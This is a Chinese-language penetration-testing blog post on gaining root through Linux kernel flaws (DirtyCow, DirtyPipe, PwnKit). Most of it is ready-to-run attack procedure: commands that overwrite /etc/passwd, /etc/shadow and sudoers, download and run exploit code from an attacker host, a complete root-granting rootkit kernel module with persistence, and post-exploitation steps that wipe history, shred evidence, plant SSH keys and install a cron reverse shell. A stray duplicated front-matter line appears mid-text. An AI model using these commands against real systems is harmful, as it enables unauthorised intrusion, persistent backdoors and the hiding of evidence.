---
title: Linux提权：内核漏洞利用
date: 2025-03-14 15:37:02
tags:
  - 权限提升
  - 渗透测试
categories: 渗透测试
description: Linux 内核漏洞提权——uname 版本号 CVE 映射、DirtyCow/DirtyPipe/PwnKit 经典利用与 searchsploit 编译实战。
---

## 前言

在Linux渗透测试中，拿到低权限shell后的首要目标就是提升至root。内核漏洞利用是最具技术含量的提权路径之一。本文梳理了Linux内核提权的核心技术栈：从信息收集到CVE映射、从经典漏洞复现到exploit搜索与编译、以及内核模块攻击等，附完整代码示例与操作细节。

---

## 一、信息收集：uname -a 与内核版本

```bash
uname -a
# Linux target 4.15.0-142-generic #146-Ubuntu SMP ... x86_64 GNU/Linux
uname -r          # 4.15.0-142-generic
cat /proc/version
cat /etc/os-release
```

版本号解析（以 `4.15.0-142-generic` 为例）：

- 4 — 主版本号 / 15 — 次版本号 / 0 — 补丁级别
- 142 — 发行版补丁号 / generic — 内核变体（generic/server/aws/kvm）

description: Linux 内核漏洞提权——内核版本 CVE 映射、DirtyCow/DirtyPipe/PwnKit 等经典漏洞利用。
---

## 二、内核版本与CVE速查映射表

| 内核版本范围 | 可利用CVE | 类型 | 难度 |
|------------|---------|------|------|
| 2.6.22 - 3.9 | CVE-2013-2094 (perf_swevent) | 任意写 | 低 |
| 2.6.31 - 3.13 | CVE-2014-0038 (recvmmsg) | 内存越界 | 低 |
| 2.6.37 - 3.8.9 | CVE-2012-0056 (mempodipper) | 权限绕过 | 极低 |
| 3.13 - 4.8.3 | CVE-2016-5195 (DirtyCow) | 条件竞争 | 中 |
| 3.14 - 4.15 | CVE-2017-1000112 (UFO) | 堆溢出 | 中 |
| 4.4 - 4.14 | CVE-2017-16995 (eBPF验证器) | 验证器缺陷 | 中 |
| 2.6.0 - 5.8 | CVE-2021-4034 (PwnKit) | 越界写 | 极低 |
| 5.8 - 5.16.11 | CVE-2022-0847 (DirtyPipe) | flags未清理 | 极低 |
| 5.11 - 6.2 | CVE-2023-0386 (OverlayFS) | 权限绕过 | 低 |

在线资源：[Linux Kernel CVEs](https://www.linuxkernelcves.com/)、[Exploit-DB](https://www.exploit-db.com/)、[NVD](https://nvd.nist.gov/)。

---

## 三、DirtyCow：CVE-2016-5195

### 漏洞概述

DirtyCow是内核内存管理子系统中潜伏9年的条件竞争漏洞。内核的写时复制（COW）机制处理私有只读映射时存在竞态窗口——攻击者可在COW写入前替换目标页，绕过只读限制向任意文件写入。

- **影响范围**: 2.6.22 (2007) 至 4.8.3 (2016)
- **利用效果**: 任意文件覆写（/etc/passwd、/etc/shadow、SUID二进制等）

### 核心原理

`mm/gup.c` 中 `__get_user_pages()` 处理 `FOLL_FORCE` 标志时强制获取COW后的写权限，但未正确校验页面只读属性。攻击线程用 `madvise(MADV_DONTNEED)` 释放目标页缓存，同时写入线程向目标写入数据。两个操作交错执行时COW检查被绕过，写入直接作用于原始只读内存页并同步到磁盘。

### Exploit使用

```bash
gcc -pthread dirtyc0w.c -o dirtyc0w
# 覆写 /etc/passwd 添加root用户
./dirtyc0w /etc/passwd "$(echo 'r00t:advwtv/xX,0:0:root:/root:/bin/bash')"
# 覆写 /etc/sudoers 免密配置
echo 'username ALL=(ALL) NOPASSWD: ALL' | ./dirtyc0w /etc/sudoers -
```

注意事项：RHEL/CentOS可能后向补丁免疫；exploit可能需要多次尝试；写入内容不能超过文件原有长度；部分内核加固可能使PoC失效。

---

## 四、DirtyPipe：CVE-2022-0847

### 漏洞概述

DirtyPipe由Max Kellermann在2022年发现，因效果类似DirtyCow而得名"脏管"。漏洞允许无写权限的用户向任意只读文件写入数据，影响范围涵盖服务器、Android、容器等。

- **影响范围**: 5.8 至 5.16.11 / 5.15.25 / 5.10.102 之前
- **利用效果**: 任意只读文件覆写

### 核心原理

管道缓冲区 `pipe_buffer.flags` 中的 `PIPE_BUF_FLAG_CAN_MERGE` 标志控制新数据能否追加到现有页末尾。`splice()` 将文件数据转移到管道时不会清除该标志——前一次管道操作设置的标志会被错误继承。随后 `write()` 向管道写入的数据会合并到文件页面缓存中，从而在无写权限的情况下修改磁盘文件。

### Exploit使用

```bash
wget https://haxx.in/files/dirtypipez.c && gcc dirtypipez.c -o dirtypipez
./dirtypipez /etc/passwd 1 "evil::0:0::/root:/bin/bash"    # 覆写passwd
./dirtypipez /etc/shadow 1 "root::19090:0:99999:7:::"      # 清空root密码
./dirtypipez /host/etc/passwd 1 "attacker::0:0::/root:/bin/bash"  # 容器逃逸
```

---

## 五、PwnKit：CVE-2021-4034

### 漏洞概述

PwnKit是polkit的pkexec组件中潜伏12年的提权漏洞，由Qualys于2021年底披露。pkexec是SUID-root二进制文件，几乎所有安装了polkit的Linux发行版默认存在。

- **影响范围**: pkexec自2009年首次commit以来的所有版本
- **利用效果**: 任何本地用户立即可获root权限

### 核心原理

当argc为0调用pkexec时，程序越界访问 `argv[0]` 和 `argv[1]`，实际读取的值由环境变量在内存中的排布决定。通过精心构造环境变量，`argv[1]` 可指向攻击者控制的路径，最终让pkexec以root权限加载恶意共享库执行任意代码。

### Exploit使用

```bash
ls -la /usr/bin/pkexec                          # 确认SUID: -rwsr-xr-x
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry
./PwnKit                                        # id → uid=0(root)
chmod 0755 /usr/bin/pkexec                      # 临时防御：移除SUID
```

攻击路径：`低权限用户 → 特殊环境变量 → pkexec(SUID) → 越界访问 → 加载恶意.so → root shell`

---

## 六、searchsploit 搜索内核Exploit

`searchsploit` 是Exploit-DB的离线搜索工具，Kali默认安装，适用于无法联网的环境。

```bash
searchsploit -u                              # 更新数据库
searchsploit linux kernel 4.15 --colour      # 按版本搜索
searchsploit --cve 2022-0847                 # 按CVE搜索
searchsploit -m 40611                        # 复制到当前目录
searchsploit -x 40611                        # 终端查看
# 基于uname自动搜索
uname -r | xargs -I {} searchsploit "linux kernel {}"
```

结合Metasploit：`msfconsole` → `search linux/local/kernel` → `use exploit/linux/local/cve_2022_0847_dirtypipe`。

---

## 七、在目标主机上编译Exploit

生产环境通常没有开发工具链，编译exploit需多种策略。

### 常见问题与方案

**问题1：gcc不存在**

```bash
gcc -static exploit.c -o exploit_static -lpthread   # 方案A: 本地静态编译（推荐）
which tcc && tcc exploit.c -o exploit                # 方案B: TinyCC轻量编译器
```

**问题2：glibc版本不匹配**

```bash
gcc -static exploit.c -o exploit_static      # 静态链接避免glibc依赖
musl-gcc -static exploit.c -o exploit_static # musl更彻底的静态链接
ldd exploit_static                           # 验证: "not a dynamic executable"
```

**问题3：架构不匹配（32位/64位/ARM）**

```bash
uname -m                                      # 确认目标架构
gcc -m32 exploit.c -o exploit_32             # 64位机编译32位
aarch64-linux-gnu-gcc -static exploit.c -o exploit_arm64
docker run --rm -v $(pwd):/wrk ubuntu:16.04 \
    bash -c "cd /wrk && gcc -static exploit.c -o exploit"
```

### 从远程传输Exploit到目标

```bash
wget http://attacker-ip/exploit -O /tmp/exploit
curl http://attacker-ip/exploit -o /tmp/exploit
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker-ip/exploit', '/tmp/exploit')"
nc attacker-ip 4444 < /tmp/exploit_if_needed  # netcat传输
chmod +x /tmp/exploit && /tmp/exploit
```

---

## 八、内核模块（LKM）攻击

如果攻击者能加载恶意内核模块，便可获得ring0级别控制权，超越root权限。

### 恶意LKM示例

```c
// rootkit.c — 加载即提权到root
#include <linux/cred.h>
#include <linux/module.h>

static int __init rootkit_init(void)
{
    struct cred *new = prepare_creds();
    if (!new) return -ENOMEM;
    new->uid.val = new->euid.val = 0;
    new->gid.val = new->egid.val = 0;
    new->suid.val = new->sgid.val = 0;
    new->fsuid.val = new->fsgid.val = 0;
    commit_creds(new);
    printk(KERN_INFO "[+] Credentials set to root\n");
    return 0;
}
static void __exit rootkit_exit(void) {}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
```

Makefile：

```makefile
obj-m += rootkit.o
KDIR := /lib/modules/$(shell uname -r)/build
all:
	make -C $(KDIR) M=$(PWD) modules
clean:
	make -C $(KDIR) M=$(PWD) clean
```

### 加载与持久化

```bash
make && insmod rootkit.ko                           # 加载（需CAP_SYS_MODULE）
lsmod | grep rootkit && rmmod rootkit               # 查看/卸载
cp rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/misc/  # 持久化
echo "rootkit" >> /etc/modules-load.d/system.conf && depmod -a
```

### LKM使用场景与防御

**适用场景**：绕过EDR/HIDS（ring3检测不到ring0操作）；隐藏进程/文件/网络连接；绕过SELinux/AppArmor。

**防御手段**：`CONFIG_MODULE_SIG_FORCE`强制签名；Secure Boot；`echo 1 > /proc/sys/kernel/lockdown`内核锁定；审计`insmod`/`modprobe`系统调用。

---

## 九、内核安全防护绕过

### KPTI / SMEP / SMAP

```
KPTI (页表隔离): 分离内核与用户态页表
  → 绕过: 使用不依赖内核地址的exploit (如DirtyPipe/PwnKit)

SMEP (禁止执行用户态代码): 内核态不能执行userspace代码
  → 绕过: 全内核ROP/JOP链，或数据攻击原语

SMAP (禁止访问用户态内存): 内核不能直接读写userspace
  → 绕过: 使用copy_from_user/copy_to_user内核API
```

### SELinux / AppArmor / 只读文件系统

```bash
getenforce && aa-status     # SELinux/AppArmor状态
mount | grep "ro," && mount -o remount,rw / 2>/dev/null   # 只读文件系统
find / -writable -type d 2>/dev/null | head               # 寻找可写分区
```

SELinux Enforcing下DirtyCow写 `/etc/passwd` 会被阻止，但 `/etc/shadow` 通常不阻止；PwnKit受影响较小。

### grsecurity / PaX

商业加固内核修补了大多数公开exploit。对策：转向非内核路径（SUID、sudo、cron、服务漏洞），或利用未受保护的设备文件与配置错误。

---

## 十、提权后操作

```bash
export HISTFILE=/dev/null && history -c && unset HISTFILE  # 清理命令历史
shred -zu /tmp/exploit /tmp/dirty*                          # 删除exploit
touch -r /etc/issue /etc/passwd                             # 重置文件时间戳
mkdir -p /root/.ssh && echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys  # SSH持久化
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'") | crontab -
```

---

## 结语

从2012年的Mempodipper到2022年的DirtyPipe，Linux内核攻击面从未消失。渗透测试人员的核心能力：

1. **建立CVE-Exploit映射库**，覆盖常见内核版本
2. **掌握交叉编译**，应对无编译环境的目标
3. **理解每种exploit原语与限制**，而非盲目运行
4. **持续跟踪新CVE**，内核提权领域迭代极快

---

## 免责声明

本文仅供授权安全研究和渗透测试使用。读者须确保所有测试均在合法授权范围内进行。未经授权对计算机系统进行攻击可能触犯《刑法》第285条（非法侵入计算机信息系统罪）等相关法律，作者不对任何滥用行为承担法律责任。

---

**参考文献**

- [DirtyCow CVE-2016-5195](https://dirtycow.ninja/)
- [DirtyPipe CVE-2022-0847 by Max Kellermann](https://dirtypipe.cm4all.com/)
- [PwnKit CVE-2021-4034 by Qualys](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
- [Linux Kernel CVEs](https://www.linuxkernelcves.com/)
- [Exploit Database](https://www.exploit-db.com/)
